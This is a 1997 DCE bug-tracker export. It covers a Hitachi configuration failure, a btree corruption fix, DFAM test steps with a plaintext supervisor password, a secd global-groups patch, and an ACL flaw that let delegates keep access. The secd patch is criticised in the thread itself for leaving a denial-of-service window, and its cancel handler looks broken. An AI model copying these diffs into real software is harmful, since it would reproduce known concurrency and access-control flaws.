CR Number                     : 13699
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : unknown
Subcomponent Name             : 
Short Description             : Hitachi Japan can't configure
Reported Date                 : 1/16/97
Found in Baseline             : 1.2.2
Found Date                    : 11/27/96
Severity                      : A
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/16/97 public]

Hitachi Japan was not able to configure DCE 1.2.2 international code on
AIX. The dce_login during dce_config fails.

Hitachi is using BL6,  sent on tape via DHL. Once Hitachi got the bits, 
they began their regression test, only to find that dce_config failed 
with errors.  Note that OSF smoketested BL6 prior to making it available 
- the core and DFS smoketests all passed.   We are confident that the bits 
they received are the correct BL6 export bits.

Effort to reproduce the problem at all 1.2.2 Sponsor sites failed; DFAM
CHO with latest BL6.5 bits passed (+60hrs) at TOG.

"backup" of the Hitachi system (RS6000-390) is available on a 4mm IBM tape
from TOG.  TOG was unable, due to several hardware glitches, to boot from
the Hitachi backup tape, in order to attempt to reproduce the problem before
GA.  Sponsors have agreed to continue investigating this problem post-GA and
update this OT with pertinent information.

[1/16/97 public]
The method used to try to reproduce the problem (get to dce_config) was:

   #1: "cd /:" does not work
         After we got through dce_login, we typed "cd /:" to end up with
      the message "bad directory."  Also, the following message was 
      displayed:

         dfs: communications failure with the fx server 202.216.113.49
         in cell dfam.rios.cell--contact lost

      We could not proceed our DCE operation any further.



CR Number                     : 13698
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : 
Short Description             : db44 potential for btree corruption
Reported Date                 : 1/16/97
Found in Baseline             : 1.2.2
Found Date                    : 1/16/97
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/16/97 public]

The bug in db44 1.85 causes a stale value for the head of the page table
to remain on disk after a close.  This is more likely to happen when
a database is re-opened, than the first time it is created, but the
fact remains that it can happen.  At best, this will cause db44 to 
miss the opportunity to re-use a free page.  At worst, it can cause
database corruption.

The fix is simple.  In module bt_page.c, update routines bt_new() and
bt_free() to include the following line when t->bt_free is modified:

F_SET(t, B_METADIRTY);

That will cause bt_close() to write the metadata page when closing
the database, thus updating the head of the free page list on disk.



CR Number                     : 13697
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : dfam
Subcomponent Name             : 
Short Description             : dlogin' does not output 'KDDS11819-I
Reported Date                 : 1/14/97
Found in Baseline             : 1.2.2
Found Date                    : 1/14/97
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/14/97 public]
The following will re-create the problem.  The problem was encountered when
using the documented instructions to install, configure and run DFAM.

Commands to execute from NetWare Client

  - Reboot client machine (exit from Windows.  From MS-DOS command,
    hit ctrl-alt-delete.  Ignore several warnings.  If it is rebooted,
    you should see MS-DOS command.)

  - Go to F: drive (input f:, then return).  Type following:

        login koolaid/supervisor
                (password "hitachi")

    If you see 'bad command' error, try "cd login" then type the above.

  - Go to C: drive (input c: then return).  Go to "C:/client/login"
    directory, then type following:

        dlogin

  **** If 'dlogin' does not output 'KDDS11819-I Change DCE password
       (Press CTRL-ENTER)" error, it means there is some kind of regression
       between BL5.5 and the final baseline.



CR Number                     : 13696
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd
Short Description             : Can't create global group when using DNS
Reported Date                 : 1/10/97
Found in Baseline             : 1.2.2
Found Date                    : 1/10/97
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : provider
Diff release                  : 1.2.2
Sensitivity                   : public

[1/10/97 public]

It was discovered that if cells were connected via DNS (ie. the "right"
way), attempting to add a foreign member to a local group returns "Registry
server unavailable".

On startup secd disables the security binding code's ability to use the NSI
for binding (it relies on the pe_site file only). In general, this is
desired behavior, but in the case of Global Groups, secd needs to
sec_id_parse_name() the FQ foreign principal. Without the NSI, secd cannot
contact the remote security server.

The change was to enable secd's use of the NSI during the
sec_id_parse_name() call in rs_pgo_add_member().

This change required locking and a global refcount to prevent multiple
threads doing rs_pgo_add_member()'s from stepping on each other or leaving
the NSI enabled when they were done.

Note that the mutex locking for the NSI state changes do not prevent
other executor threads from using the NSI to do binding. The mutex
locking is to prevent leaving the NSI enabled after all the threads
that need it are done. Doing otherwise would incur a significant
performance hit.

Another issue arose in that a malicious user could tie up all of secd's
call threads by repeatedly adding a foreign principal from a
known-unavailable cell to a local group. The solution to this problem was
to create a seperate thread pool to service only the rs_pgo_add_member
operations. 

Diffs follow:

Files changed:
src/security/h/rs_lock.h
src/security/h/rs_ns.h
src/security/idl/sec.sams
src/security/server/rs/rs_lock.c
src/security/server/rs/rs_main.c
src/security/server/rs/rs_misc.c
src/security/server/rs/rs_ns.c
src/security/server/rs/rs_pgo.c

*** rs_lock.h@@/main/jrr_122_8/0        Mon Dec  2 13:25:38 1996
--- rs_lock.h   Tue Dec  3 12:32:10 1996
***************
*** 82,88 ****
  
  typedef enum lock_type_t {
          lock_db, lock_replist, lock_log, lock_kdc, lock_master_info,
!       lock_login_info
  } lock_type_t;
  
  typedef enum lock_mode_t {
--- 82,88 ----
  
  typedef enum lock_type_t {
          lock_db, lock_replist, lock_log, lock_kdc, lock_master_info,
!       lock_login_info, lock_nsi_access
  } lock_type_t;
  
  typedef enum lock_mode_t {





*** rs_ns.h@@/main/jrr_122_8/0  Mon Dec  2 13:06:00 1996
--- rs_ns.h     Mon Jan  6 16:48:52 1997
***************
*** 60,66 ****
--- 60,107 ----
  
  #include <dce/nbase.h>
  #include <dce/rgynbase.h>
+ #include <rs_lock.h>
  
+ /*
+  * Global reference count for NSI state IN SECD. This is for the security
+  * server's use only. By default the state is on (>0), but this will be
+  * changed on secd startup in rs_login.c:rs_login_pvt_setup_context()
+  */
+ extern signed32 rs_ns_use_nsi_refcount;
+ 
+ /*
+  * Turn on the ability use the NSI for security server binding in a 
+  * thread safe way.
+  */
+ #define RS_NS_ENABLE_NSI \
+     { \
+         lock_type_t  rs_ns_nsi_lock = lock_nsi_access; \
+         lock(rs_ns_nsi_lock, lock_mode_write); \
+         rs_ns_use_nsi_refcount++; \
+         if (rs_ns_use_nsi_refcount == 1) \
+             sec_rgy_enable_nsi(true); \
+         unlock(rs_ns_nsi_lock, lock_mode_write); \
+         TRY {
+ 
+ #define RS_NS_NSI_DONE \
+         } CATCH(pthread_cancel_e) { \
+             lock(rs_ns_nsi_lock, lock_mode_write); \
+             rs_ns_use_nsi_refcount--; \
+             if (rs_ns_use_nsi_refcount > 0) rs_ns_use_nsi_refcount--; \
+                 sec_rgy_enable_nsi(false); \
+             unlock(rs_ns_nsi_lock, lock_mode_write); \
+             RERAISE; \
+         } CATCH_ALL { \
+             dce_svc_printf(SEC_RS_LOCK_FATAL_EXC_MSG, \
+                            mode_string(lock_mode_write), \
+                            type_string(rs_ns_nsi_lock)); \
+         } ENDTRY; \
+         lock(rs_ns_nsi_lock, lock_mode_write); \
+         if (rs_ns_use_nsi_refcount > 0) rs_ns_use_nsi_refcount--; \
+         if (rs_ns_use_nsi_refcount == 0) \
+             sec_rgy_enable_nsi(false); \
+         unlock(rs_ns_nsi_lock, lock_mode_write); \
+     }
  
  PUBLIC void rs_ns_bootstrap_enable (
  #ifdef __STDC__





*** sec.sams@@/main/DCE_1.2.2/jrr_122_8/0       Mon Jan  6 13:30:35 1997
--- sec.sams    Mon Jan  6 13:38:35 1997
***************
*** 5038,5043 ****
--- 5038,5067 ----
  engineer      "Sekhar Vajjhala"
  end
  
+ # Files : rs_main.c
+ start
+ code          sec_rs_thr_pool_create_fail
+ text          "Unable to create thread pool: %d"
+ notes         "%d is a status code."
+ explanation   "The call to rs_misc_init_thread_pool failed."
+ action                "None required."
+ sub-component sec_s_rs_thr
+ attributes    svc_c_sev_fatal
+ engineer      "John Rousseau"
+ end
+ 
+ # Files : rs_misc.c
+ start
+ code          sec_rs_thr_pool_set_fn_fail
+ text          "Unable to set thread pool function: %d"
+ notes         "%d is a status code."
+ explanation   "The call to rpc_server_set_thread_pool_fn failed."
+ action                "None required."
+ sub-component sec_s_rs_thr
+ attributes    svc_c_sev_fatal
+ engineer      "John Rousseau"
+ end
+ 
  #  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
  #  %                                                          %
  #  %      Messages logged by sec_create_db                    %





*** rs_lock.c@@/main/jrr_122_8/0	Tue Dec  3 13:17:05 1996
--- rs_lock.c	Tue Dec  3 13:20:47 1996
***************
*** 98,110 ****
  /* master info lock */
  static  lock_pvt_t  login;
  
! #define NUM_LOCKS 6
  static  lock_pvt_t  *known_locks[NUM_LOCKS] = { &db,
                                                  &replist,
                                                  &log,
                                                  &kdc,
                                                  &master_info,
!                                                 &login
                                                };
  
  static  char   *lock_debug_info[NUM_LOCKS] = { "database lock",
--- 98,114 ----
  /* master info lock */
  static  lock_pvt_t  login;
  
! /* NSI access lock */
! static  lock_pvt_t  nsi_access;
! 
! #define NUM_LOCKS 7
  static  lock_pvt_t  *known_locks[NUM_LOCKS] = { &db,
                                                  &replist,
                                                  &log,
                                                  &kdc,
                                                  &master_info,
!                                                 &login,
!                                                 &nsi_access
                                                };
  
  static  char   *lock_debug_info[NUM_LOCKS] = { "database lock",
***************
*** 112,118 ****
                                                 "log lock",
                                                 "KDC lock",
                                                 "master info lock",
!                                                "login info lock"
                                               };
  
  PRIVATE print_lock_info
--- 116,123 ----
                                                 "log lock",
                                                 "KDC lock",
                                                 "master info lock",
!                                                "login info lock",
!                                                "NSI access lock"
                                               };
  
  PRIVATE print_lock_info
***************
*** 135,146 ****
          sprintf(buf, "%s: db\n", type);
      } else if (lock_p == &log) {
          sprintf(buf, "%s: log\n", type);
!      } else if (lock_p == &kdc) {
          sprintf(buf, "%s: kdc\n", type);
!      } else if (lock_p == &master_info) {
          sprintf(buf, "%s: master_info\n", type);
!      } else if (lock_p == &login) {
          sprintf(buf, "%s: login_info\n", type);
      } else {
          sprintf(buf, "%s: <unknown lock>\n", type);
      }
--- 140,153 ----
          sprintf(buf, "%s: db\n", type);
      } else if (lock_p == &log) {
          sprintf(buf, "%s: log\n", type);
!     } else if (lock_p == &kdc) {
          sprintf(buf, "%s: kdc\n", type);
!     } else if (lock_p == &master_info) {
          sprintf(buf, "%s: master_info\n", type);
!     } else if (lock_p == &login) {
          sprintf(buf, "%s: login_info\n", type);
+     } else if (lock_p == &nsi_access) {
+         sprintf(buf, "%s: nsi_access\n", type);
      } else {
          sprintf(buf, "%s: <unknown lock>\n", type);
      }
***************
*** 212,217 ****
--- 219,228 ----
          case lock_login_info:
              lock_p = &login;
              break;
+ 
+         case lock_nsi_access:
+             lock_p = &nsi_access;
+             break;
      }
  
      return lock_p;
***************
*** 376,382 ****
  					  "log",
                                            "KDC",
  					  "master info",
! 					  "login info"
  					 };
  
  PUBLIC char *type_string
--- 387,394 ----
  					  "log",
                                            "KDC",
  					  "master info",
! 					  "login info",
!                                           "NSI access"
  					 };
  
  PUBLIC char *type_string





*** rs_main.c@@/main/DCE_1.2.2/jrr_122_8/0      Mon Dec 30 14:18:27 1996
--- rs_main.c   Mon Jan  6 13:37:11 1997
***************
*** 300,305 ****
--- 300,306 ----
  #include <rs_task.h>
  #include <rs_log.h>
  #include <rs_util.h>
+ #include <rs_misc.h>
  #include <rs_audit_trail.h>
  #include <rs_rep_mgmt.h>
  #include <rs_rep_auth.h>
***************
*** 335,340 ****
--- 336,344 ----
  #define _SEC_AUDIT_FILTER_ENV "DCEAUDITFILTERON=1"
  #endif        /* defined(DCE_AUD_POINTS) */
  
+ /* Number of threads to create in the alternate thread pool. */
+ #define RS_NUM_POOL_THREADS 2
+ 
  /*
   * Prototypes for local routines
   */
***************
*** 377,382 ****
--- 381,389 ----
  
  extern boolean32  priv_debug;
  
+ /* Handle to the 'dangerous' thread pool. Defined in rs_misc.c */
+ extern rpc_thread_pool_handle_t rs_thread_pool_h;
+ 
  PUBLIC boolean32             rs_verbose     = false;
  PUBLIC boolean32             rs_prop_debug  = false;
  
***************
*** 642,647 ****
--- 649,667 ----
          }
  
  
+         /*
+          * Initialize an additional thread pool for servicing operations
+          * that may potentially block for an extended period of time.
+          */
+         rs_thread_pool_h = rs_misc_init_thread_pool(RS_NUM_POOL_THREADS,
+                                                     &status);
+         if (BAD_STATUS(&status)) {
+             dce_svc_printf(DCE_SVC(sec_svc_handle, ""),
+                            sec_s_rs_main,
+                            svc_c_sev_fatal | svc_c_action_exit_bad,
+                            sec_rs_thr_pool_create_fail, status);
+         }
+             
          /*
           * Start the listener tasks
           * rs_login_become_rgy will make call to secd





*** rs_misc.c@@/main/jrr_122_8/0	Thu Dec 19 13:11:18 1996
--- rs_misc.c	Mon Jan  6 16:23:49 1997
***************
*** 119,124 ****
--- 119,125 ----
  #include <rs_util.h>
  #include <rs_auth.h>
  #include <rs_secidmap.h>
+ #include <rs_pgo.h>
  #include <rsdb_acct.h>
  #include <rsdb_pgo.h>
  #include <rsdb_acl.h>
***************
*** 425,428 ****
--- 426,583 ----
  	rsdb_checkpt_reset_interval(do_checkpt_now, new_checkpt_interval, 
  		at_time_str, status);
      }
+ }
+ 
+ 
+ /* 
+  * The following functions and data structures are to manage an additional 
+  * threads pool for 'dangerous' operations. Stolen from the DFS thread pool
+  * work.
+  */ 
+ 
+ /* 
+  * Some constants
+  */
+ #define RS_THREAD_POOL_ENTRIES 1
+ 
+ /* The global list of operations to select for the pool */
+ typedef struct {
+     rpc_if_handle_t  *ifspec;              /* the exported interface */
+     rpc_if_id_t      *ifspec_id;           /* the exported interface ID */
+     unsigned32       op_num;               /* the operation number */
+ } pool_table_entry;
+ 
+ /* The operations to put into the pool. One entry per interface-operation pair. */
+ PRIVATE pool_table_entry pool_table[RS_THREAD_POOL_ENTRIES] = {
+     {&rs_pgo_v1_0_s_ifspec, NULL, 6}  /* rs_pgo_add_member */
+ };
+ 
+ /* Handle to the thread pool. Set during startup in rgy_main(). */
+ rpc_thread_pool_handle_t rs_thread_pool_h = NULL;
+ static pthread_mutex_t rs_thread_pool_mutex;   /* mutex lock for pool table */
+ static unsigned32 rs_g_thread_pool_inited = 0; /* init flag */
+ 
+ 
+ /*
+  * The callback to locate a reserved thread-pool if the rpc call is 
+  * considered 'dangerous'. 
+  */
+ static void
+ rs_misc_lookup_pool(uuid_t *object_uuid,
+                     rpc_if_id_t *interface_id, 
+                     unsigned32 op_num,
+                     rpc_thread_pool_handle_t *pool_h,
+                     unsigned32 *st)
+ {
+     rpc_if_id_t         ifspec_id;
+     unsigned32          i;
+ 
+     CLEAR_STATUS(st);
+ 
+     *pool_h = NULL;
+ 
+     if (op_num == 0)
+         return;
+ 
+    /* 
+     * Check whether the call is from an appropriate ifspec,
+     * Check whether the call is with the appropriate operation number. 
+     * (ie., from the set of interfaces we consider 'dangerous'.)
+     */
+     pthread_mutex_lock(&rs_thread_pool_mutex);
+     for (i = 0; (i < RS_THREAD_POOL_ENTRIES); i++)  {
+         if (op_num == pool_table[i].op_num) {
+             if (uuid_equal(&interface_id->uuid, 
+                            &(*(pool_table[i].ifspec_id)).uuid, st)) {
+ 		*pool_h = rs_thread_pool_h;
+                 DCE_SVC_DEBUG((sec_svc_handle, sec_s_rs_thr, svc_c_debug1,
+                                "Got interface/opnum match, pooling RPC.\n"));
+                 break;
+             }
+ 	}
+     } 
+     pthread_mutex_unlock(&rs_thread_pool_mutex);
+     return;
+ }
+ 
+ 
+ /* 
+  * Create an additional pool of threads for 'dangerous' operations.
+  * These are operations that could block for an extended period of time.
+  * Currently this is just for the rs_pgo_add_member operation because
+  * it can go remote to a security server in a foreign cell.
+  * Update pool_table above (and RS_THREAD_POOL_ENTRIES) to select more 
+  * interface-operation pairs for the pool.
+  * 
+  * This function should only be called at server startup time.
+  */
+ rpc_thread_pool_handle_t
+ rs_misc_init_thread_pool(unsigned32 num_threads,
+                          error_status_t *st)
+ {
+     rpc_thread_pool_handle_t    pool_p;
+     unsigned32                  i;
+     rpc_if_id_t                 *ifspec_id;
+     boolean32                   wait_flag = 1;
+     static unsigned32           lookup_fn_set = 0;
+ 
+     CLEAR_STATUS(st);
+ 
+     if (rs_g_thread_pool_inited)
+         return;
+ 
+     pthread_mutex_init(&rs_thread_pool_mutex, pthread_mutexattr_default);
+ 
+     rpc_server_create_thread_pool(num_threads, &pool_p, st);
+     if (BAD_STATUS(st)) {
+         return NULL;
+     }
+ 
+     /* Populate the the table with the interface uuids */
+     for (i = 0; i < RS_THREAD_POOL_ENTRIES; i++) {
+         ifspec_id = (rpc_if_id_t *)malloc(sizeof(rpc_if_id_t));
+         if (ifspec_id == NULL) 
+             dce_svc_printf(DCE_SVC(sec_svc_handle, ""),
+                            sec_s_rs_main,
+                            svc_c_sev_fatal | svc_c_action_exit_bad,
+                            sec_rgy_cant_allocate_memory);
+             
+         rpc_if_inq_id(*(pool_table[i].ifspec), ifspec_id, st);
+ 
+         if (BAD_STATUS(st)) {
+             free(ifspec_id);
+             goto fail;
+         }
+ 
+         pool_table[i].ifspec_id = ifspec_id;
+ 
+         {
+             unsigned_char_t *_tmp = NULL;
+ 
+             uuid_to_string(&ifspec_id->uuid, &_tmp, st);
+             DCE_SVC_DEBUG((sec_svc_handle, sec_s_rs_thr, svc_c_debug1,
+                            "Initializing pool_table[%d] with op_num = %d, if uuid = %s\n", i, pool_table[i].op_num, _tmp));
+         }
+     }
+ 
+ 
+     if (!lookup_fn_set) {
+         rpc_server_set_thread_pool_fn((rpc_thread_pool_fn_t )rs_misc_lookup_pool, 
+                                       st);
+         if (BAD_STATUS(st)) {
+             dce_svc_printf(DCE_SVC(sec_svc_handle, ""),
+                            sec_s_rs_main,
+                            svc_c_sev_fatal | svc_c_action_exit_bad,
+                            sec_rs_thr_pool_set_fn_fail, *st);
+             goto fail;
+         }
+         lookup_fn_set = 1;
+     }
+ 
+     rs_g_thread_pool_inited = 1;
+     return pool_p;
+ 
+ fail:
+     rpc_server_free_thread_pool(&pool_p, wait_flag, st);
+     return NULL;
  }





*** rs_ns.c@@/main/jrr_122_8/0  Fri Jan  3 16:42:46 1997
--- rs_ns.c     Mon Jan  6 16:07:41 1997
***************
*** 247,252 ****
--- 247,258 ----
  static unsigned_char_p_t   rs_ns_server_name = NULL;
  
  /*
+  * Global reference count for NSI state IN SECD. This is for the security
+  * server's use only.
+  */
+ signed32 rs_ns_use_nsi_refcount = 0;
+ 
+ /*
   * Attribute name (ie. Object ID) in ns of rep_id attribute 
   */
  #define rs_ns_c_attrib_rep_id   ((unsigned_char_p_t) "1.3.22.1.5.1")





*** rs_pgo.c@@/main/DCE_1.2.2/jrr_122_8/0       Mon Nov 25 11:30:55 1996
--- rs_pgo.c    Fri Jan  3 16:51:07 1997
***************
*** 183,188 ****
--- 183,189 ----
  #include <rs_ch_lock.h>
  #include <rs_ver.h>
  #include <rs_ver_pvt.h>
+ #include <rs_ns.h>
  #include <rsdb_pgo.h>
  #include <rsdb_name_util.h>
  #include <rsdb_util.h>
***************
*** 1571,1578 ****
            }
  
            if ( STATUS_OK(status) ) {
!               sec_id_parse_name(NULL, person_name,
!                    cell_name, &cell_uuid, princ_name, &princ_uuid, status);
                member_cell_uuid_p = &cell_uuid;
                member_princ_uuid_p = &princ_uuid;
            }
--- 1572,1594 ----
            }
  
            if ( STATUS_OK(status) ) {
!                 /* 
!                  * Flip the big switch in the security binding code so
!                  * that the NSI is used for binding. Otherwise, we can 
!                  * not find the remote cell when using a global name
!                  * service, and the sec_id_parse_name() will return
!                  * "Registry server unavailable". Restore the state
!                  * when we are done.
!                  */
!                 RS_NS_ENABLE_NSI {
!                     sec_id_parse_name(NULL, 
!                                       person_name,
!                                       cell_name, 
!                                       &cell_uuid, princ_name,
!                                       &princ_uuid,
!                                       status);
!                 } RS_NS_NSI_DONE;
! 
                member_cell_uuid_p = &cell_uuid;
                member_princ_uuid_p = &princ_uuid;
            }


[domian   1/17/97  public]

NOTE: The diff offered above ("jrr 1/10/97 public"] has been tested and
proven to solve a portion of the associated problem.  However, a recent
review of the diff uncovered a flaw.
The following is a recommended total solution to this OT.  Note that due
to the GA-schedule, it was not implemented and tested.  It is offered here
as an unsupported solution.
---------------------------

"John" == John Rousseau <jrr@apollo.hp.com> writes:

    On Monday, 6 Jan 1997 16:59:32 -0500 John Rousseau from HP wrote
regarding the latest Global Groups design change:

John> Here are the latest set of changes to help secd use the NSI in a
John> thread-safe, denial-of-service-attack resistant and environmentally
John> friendly way.

    HP's latest GG design change is NOT "denial-of-service-attack
resistant".  When one or more threads in the secd process executes the
rs_pgo_add_member(), it will turn on the global variable to allow NSI
lookups to be done ... the other threads in the secd process will now be
forced to use the NSI lookup (incurring additional performance
penalties) AND allowing a "denial-of-service-attack" (which the
original design intentionally avoided) until ALL of the threads which
are executing the rs_pgo_add_member() are finished and turn off the
global variable.

    On Wednesday, 15 Jan 1997 14:46:20 -0500 John Rousseau from HP wrote:

John>                            Having secd use the NSI for binding is
John> not a bad thing. I agree that having unpredictable binding semantics
John> is not ideal, but there is no other choice at this point. 

    John Rousseau agrees that the latest GG design does have this
"window", but HP will NOT be addressing this design flaw.

    This "window" of "denial-of-service-attack" can easily be
eliminated.  I would like to propose these changes to the GG design,
which would allow a thread specific value for each thread to determine
if the NSI lookups should be done:

    1) Another global variable should be created in
       src/security/client/rca/internal_binding.c preferrably
       near the rca_use_nsi (since it expands it's meaning) 
            boolean32 rca_check_pthread_specific = false;

       Secd would enable the global variable
            rca_check_pthread_specific = true;

    2) A thread specific key should be created in secd initialization
            pthread_keycreate(&rca_use_nsi_key, NULL);

    3) In the RS_NS_ENABLE_NSI Macro, set the thread specific to true at the
       beginning and when completed turn to false
            pthread_setspecific(rca_use_nsi_key, true);
            .
            .
            .   
            pthread_setspecific(rca_use_nsi_key, false);
        
    4) In the rca_nsi_binding_import() function, wherever rca_use_nsi
       is used change it to
            rca_use_nsi && ((rca_check_pthread_specific &&
                             (0 == pthread_getspecific(rca_use_nsi_key, &rca_use_nsi_in_thread)) &&
                             rca_use_nsi_in_thread)  ||
                            !rca_check_pthread_specific)

    With these changes ONLY the threads that are executing the rs_pgo_add_member
will be doing the NSI lookups, all the other threads will not be effected.


--
William E. Hannon Jr.                         internet:whannon@austin.ibm.com
AIX/DCE Technical Lead                                         whannon@austin
Austin, Texas 78758     Department ATKS/9132     Phone:(512)838-3238 T/L(678)
'Confidence is what you had, before you understood the situation.' Dr. Dobson



CR Number                     : 13694
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : secd, libdce ACL eval
Short Description             : acl evaluation wrong for delegated privs
Reported Date                 : 1/7/97
Found in Baseline             : 1.2.1
Found Date                    : 1/7/97
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/server/rsdb/rsdb_daclmgr.c, utils/acldb/acleval.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/7/97 public]

A support customer reported the following problem.

Code inspection revealed:
DCE 1.1 maint  - dce_acl_inq_permset_for_creds has fixed the *st pointer
	         problem.
DCE 1.2.1maint - dce_acl_inq_permset_for_creds still has one place where
		 'st != error_status_ok' instead of *st.
DCE 1.2.2      - dce_acl_inq_permset_for_creds still has one place where
		 'st != error_status_ok' instead of *st.

Otherwise the remaining diffs supplied below can be applied and tested.
=======================================================================

Full Description: 
 The acl evaluation algorithms do not correctly adjust for access rights
 when a delegate ( not the initiator ) specified in an epac chain (creds)
 has no privileges specified in the acl being checked against.

 This is true for the dce api call
   dce_acl_inq_permset_for_creds (src/dce/utils/acldb/acleval.c)
 and the security server acl manager
   sec_acl_mgr_get_access (src/security/server/rsdb/rsdb_daclmgr.c)

 While the first call incorrectly returns because of a failure of
 a check that compares st ( a pointer to status ) versus *st to 
 error_status_ok. Further it does not adjust the permissions
 granted by 'AND'ing the initiator permissions with those of delegates.

 The second (rsdb acl manager) breaks out of the loop if it fails to
 get access for a delegate without adjusting the permissions returned.
 
Repeat By: 
 Create user (initiator) acl entry on an object under /.:/sec
 junction without permission for user delegate. Access this object with
 a delegated login identity.

 Inspect code in dce_acl_inq_permset_for_creds and
 sec_acl_mgr_get_access.

Proposed Solution:
 A context diff for a potential fix included below. 

 
Archive file: \\buckwheat\dce32\dce32_rcs\src/dce/utils/acldb\acleval.c,v
retrieving revision 1.21.1.1
retrieving revision 1.21.1.2
diff -r1.21.1.1 -r1.21.1.2
*** C:/wk/sb/src/dce/utils/acldb/rdif00FC.aaa Fri Dec 13 15:06:38 1996
--- C:/wk/sb/src/dce/utils/acldb/rdif00FC.aab Fri Dec 13 15:06:38 1996
***************
*** 7,13 ****
   * 
   * HISTORY
   * $Log:	c013694,v $
# Revision 1.2  97/01/08  10:36:05  root
# changed fields: Subcomponent Name  Affected File(s)   new/changed/deleted note(s) [burati 1/8/97 public]
# 
# Revision 1.1  97/01/07  21:53:53  root
# new CR
# 
!  * Revision 1.21.1.1  96/07/29 22:00:02  kevin
   * Merge 1.1 changes into 1.2.1 code base
--- 7,15 ----
   * 
   * HISTORY
   * $Log:	c013694,v $
# Revision 1.2  97/01/08  10:36:05  root
# changed fields: Subcomponent Name  Affected File(s)   new/changed/deleted note(s) [burati 1/8/97 public]
# 
# Revision 1.1  97/01/07  21:53:53  root
# new CR
# 
!  * Revision 1.21.1.2  96/12/12 22:23:26  bhandaru
!  * name to cred secd extension plus acl eval bugfixes
!  * Revision 1.21.1.1  1996/07/29 22:00:02  kevin
   * Merge 1.1 changes into 1.2.1 code base
***************
*** 747,752 ****
--- 749,755 ----
      sec_cred_pa_handle_t	cred_pa;
      sec_cred_cursor_t		del_cursor;
      error_status_t		xst;
+     sec_acl_permset_t 		net_rights; /* Gradient Fix */
  
      *st = error_status_ok;
      *perms = dce_acl_c_no_permissions;
***************
*** 769,778 ****
  
      dce_acl__permset_alg(FALSE, pa_p, ap, own_id, grp_id,
  		&unauth_mask, posix_semantics, perms, st);
!     if (st != error_status_ok) {
! 	return;
!     }
  
      /* Now, loop through the delegates, doing the same check. */
      sec_cred_initialize_cursor(&del_cursor, st);
      STAT_CHECK_RET(*st);
--- 772,782 ----
  
      dce_acl__permset_alg(FALSE, pa_p, ap, own_id, grp_id,
  		&unauth_mask, posix_semantics, perms, st);
!     STAT_CHECK_RET(*st); /*Gradient Fix */
!     /* WAS if (st != error_status_ok) { return; } */
  
+     net_rights = *perms;  /*Gradient Fix */
+ 
      /* Now, loop through the delegates, doing the same check. */
      sec_cred_initialize_cursor(&del_cursor, st);
      STAT_CHECK_RET(*st);
***************
*** 781,786 ****
--- 785,791 ----
  	    sec_cred_free_cursor(&del_cursor, &xst);
  	    return;
  	}
+ 
  	cred_pa = sec_cred_get_delegate(cred_h, &del_cursor, st);
  	if (*st == sec_cred_s_no_more_entries) {
  	    *st = error_status_ok;
***************
*** 801,808 ****
--- 806,816 ----
  	    *perms = dce_acl_c_no_permissions;
  	    return;
  	}
+         net_rights = (net_rights & (*perms));  /*Gradient Fix */
      }
      sec_cred_free_cursor(&del_cursor, &xst);
+ 
+     *perms = net_rights;  /*Gradient Fix */
  
      /* If creds were not authenticated then apply the unauth mask perms */
      if (!auth) {




Archive file: \\buckwheat\dce32\dce32_rcs\src/security/server/rsdb\rsdb_daclmgr.c,v
retrieving revision 1.21.1.1
retrieving revision 1.21.1.2
diff -r1.21.1.1 -r1.21.1.2
*** C:/wk/sb/src/security/server/rsdb/rdif0091.aaa Fri Dec 13 15:09:04 1996
--- C:/wk/sb/src/security/server/rsdb/rdif0091.aab Fri Dec 13 15:09:04 1996
***************
*** 1253,1259 ****
  		    &granted, auth, stp);
                  if (GOOD_STATUS(stp) && got_access) {
                      *net_rights = (*net_rights & granted);
!                 }
              }
          }
      } while (GOOD_STATUS(stp) && got_access);
--- 1253,1264 ----
  		    &granted, auth, stp);
                  if (GOOD_STATUS(stp) && got_access) {
                      *net_rights = (*net_rights & granted);
!                 } else {
! 		   /* GRADIENT FIX. If we failed to get access for a delegate
! 	 	    * in the chain, we do not want to grant access at all !
! 		    * - nb */
! 		   if (!got_access) *net_rights = (sec_acl_permset_t)0;
! 		}
              }
          }
      } while (GOOD_STATUS(stp) && got_access);

--=====================_850525987==_
Content-Type: text/plain; charset="us-ascii"



-----------------------------------------------------------
--=====================_850525987==_--

[1/8/97 public]
Good catch (shows how little the tests are really testing :-( ).
I've reviewed the above rsdb_daclmgr.c fix and it looks correct.
I'm not as familiar with the acleval.c code, so I'll have to take a
look at it later today.  

I took a quick look at my original delegate ACL eval code (used by fnc tests)
in src/test/security/svr_example/dacl_manager.c and it doesn't appear to
have this problem.  I'll open a test defect, stating that the authz
checks in the DCE ACL lib and secd need tests written for them,
